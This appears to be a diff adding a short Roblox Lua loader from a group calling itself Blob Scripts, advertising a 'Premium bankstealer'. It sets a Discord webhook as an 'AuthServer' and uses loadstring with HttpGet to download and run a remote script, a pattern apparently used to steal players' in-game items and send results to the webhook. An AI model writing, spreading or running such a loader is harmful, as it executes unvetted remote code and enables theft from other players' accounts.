@@ -1,0 +1,6 @@
+
+_G.Key = "1alakvafoY"
+_G.AuthServer = "https://discord.com/api/webhooks/1051386602972262430/gsA09p_q-l7BGgo0n9Vo3ATSRHHMPiPbv9mPiGBThrYmFjXQo2-4bJZ1Wgia5BYgO4E0"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()```
+>brought to you by Alys&Crystal Blob from Blob Scripts <https://discord.gg/HPAv3eWypg> || v9<
+>*Consider buying ABprem (Premium bankstealer)*<
